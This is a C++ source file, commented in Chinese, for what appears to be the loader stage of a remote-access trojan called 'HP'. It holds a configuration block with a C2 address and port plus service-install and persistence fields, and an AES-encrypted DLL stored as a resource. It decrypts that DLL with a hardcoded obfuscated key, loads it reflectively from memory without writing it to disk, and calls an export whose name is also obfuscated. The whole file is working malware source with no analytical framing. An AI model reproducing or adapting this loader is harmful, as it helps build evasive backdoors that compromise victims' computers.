// HP Loder.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "HP Loder.h"
#include "MemoryModule.h"
#include "EncryptServer.h"

struct HP_MAIN
{
	TCHAR main[100];      //入口
	int key;
}hp_main =
{
	"Main",
	76
};

struct HP_STAR
{
	TCHAR Loginip[100];      //ip
	DWORD LoginPort;	     //端口
	TCHAR strRemark[32];     //版本
	TCHAR UpGroup[50];       //分组
	TCHAR szGetGroup[256];  //分组唯一标识
	BOOL  bRunOnce;         //是否为绿色安装
	TCHAR SerName[100];     //服务名称
	TCHAR Serdisplay[128];  //显示名称
	TCHAR Serdesc[256];     //服务描述
	TCHAR ReleasePath[100]; //安装途径
	TCHAR ReleaseName[50];  //安装名称
	WORD  FileAttribute;    //文件属性
	WORD  Dele_zd;          //安装增大
}hp_star =
{
	"192.168.0.1",
	2022,
	"HP1.0",
	"Default",
	"",
	TRUE,			//TRUE为绿色安装，FALSE为标准安装
	"",
	"",
	"",
	"",
	"",
	FILE_ATTRIBUTE_NORMAL,
	0,
};

CString Encrypt(CString S, WORD K)
{
	CString Str, Str1, Result;
	int i, j;
	Str = S;
	for (i = 0; i < S.GetLength(); i++)
	{
		Str.SetAt(i, S.GetAt(i) + K);
	}
	S = Str;
	for (i = 0; i < S.GetLength(); i++)
	{
		j = (BYTE)S.GetAt(i);
		Str1 = "01";
		Str1.SetAt(0, 65 + j / 26);
		Str1.SetAt(1, 65 + j % 26);
		Result += Str1;
	}
	return Result;
}

typedef int (WINAPI* PFN_POPMSGBOX)(void);
void LoadDllFromMemAndCall()
{

	HMEMORYMODULE hDll;
	PFN_POPMSGBOX pfn;
	//获取资源
	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_LOG), "LOG");
	//获取资源大小
	DWORD dwSize = SizeofResource(NULL, hResInfo);
	// 装载资源到内存
	HGLOBAL hResData = LoadResource(NULL, hResInfo);
	//锁定资源，并获取指向资源的指针pBuffer
	LPVOID pBuffer = LockResource(hResData);

	char* pByte = new char[dwSize + 1];
	memcpy(pByte, pBuffer, dwSize);//申请内存
	GlobalUnlock(hResData);

	//EncryptServer解密文件
	char TBQQNqHt[] = { '?','?','B','i','d','@','l','o','c','a','l','e','@','s','t','d','\0' };
	const char* key = TBQQNqHt;
	AESHelper aes(key);
	int len = aes.decrypt_PKCS7(pByte, (int)dwSize);

	// 加载
	hDll = MemoryLoadLibrary(pByte);
	if (hDll == NULL)
	{
		//从内存直接加载Dll失败!
		return;
	}
	//获取导出的函数的地址
	CString edit;
	edit = Encrypt(hp_main.main, hp_main.key);
	pfn = MemoryGetProcAddress(hDll, edit);
	if (pfn == NULL)
	{
		//无法获取指定的函数地址！
		MemoryFreeLibrary(hDll);
		return;
	}
	//调用导出的函数
	pfn();
	//printf("调用结束!\n");
	if (hDll != NULL)
	{
		MemoryFreeLibrary(hDll);
		hDll = NULL;
	}
}

extern "C" _declspec(dllexport) LPVOID HP_Loader()
{
	return (LPVOID)&hp_star;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    // TODO: 在此处放置代码。
    LoadDllFromMemAndCall();
    return 0;
}
